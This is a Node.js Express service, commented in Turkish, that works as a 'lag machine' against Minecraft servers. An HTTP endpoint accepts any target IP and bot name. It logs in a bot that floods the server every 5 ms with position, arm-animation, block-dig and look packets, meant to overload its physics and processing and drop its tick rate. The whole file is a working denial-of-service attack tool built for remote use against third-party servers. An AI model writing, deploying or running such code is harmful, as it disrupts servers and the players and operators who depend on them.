const express = require('express');
const mc = require('minecraft-protocol');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 10000;

app.use(cors());

let client = null;
let floodTimer = null;

app.get('/bot-gonder', (req, res) => {
    const { ip, isim } = req.query;
    if (client) { client.end(); clearInterval(floodTimer); }

    console.log(`[SALDIRI MODU] Hedef: ${ip} | Bot: ${isim}`);

    client = mc.createClient({
        host: ip,
        port: 25565,
        username: isim,
        version: "1.20.1",
        noDelay: true // Paketleri birleştirmeden anında fırlatır
    });

    client.on('success', () => {
        console.log("!!! SIZMA TAMAMLANDI: PAKET YAĞMURU BAŞLIYOR !!!");
        
        // Sunucuya girdikten 3 saniye sonra başla
        setTimeout(() => {
            floodTimer = setInterval(() => {
                if(!client) return;

                try {
                    // 1. Fizik Motorunu Yor: Sürekli havada/yerde konum değiştirme
                    client.write('position', { x: 100, y: 64, z: 100, onGround: (Math.random() > 0.5) });

                    // 2. Animasyon İşlemcisini Yor: Saniyede onlarca kol sallama
                    client.write('arm_animation', { hand: 0 });

                    // 3. Etkileşim Kuyruğunu Şişir: Blok kırma paketleri (Blok olmasa bile sunucu kontrol eder)
                    client.write('block_dig', { status: 0, location: { x: 100, y: 64, z: 100 }, face: 1 });

                    // 4. Bakış Hesaplamasını Yor: Rastgele kafa hareketleri
                    client.write('look', { yaw: Math.random() * 360, pitch: Math.random() * 180, onGround: true });
                } catch (e) {
                    clearInterval(floodTimer);
                }
            }, 5); // 5ms'de bir paket! (Saniyede yaklaşık 200 işlem)
        }, 3000);
    });

    client.on('error', (err) => {
        console.log("Bağlantı Kesildi:", err.message);
        clearInterval(floodTimer);
    });

    res.send("Lag Protokolü Devreye Girdi. TPS Kontrol Et!");
});

app.get('/bot-zipla', (req, res) => res.send("ENGINE_READY"));
app.listen(port, '0.0.0.0', () => console.log(`Lag Machine Active on ${port}`));
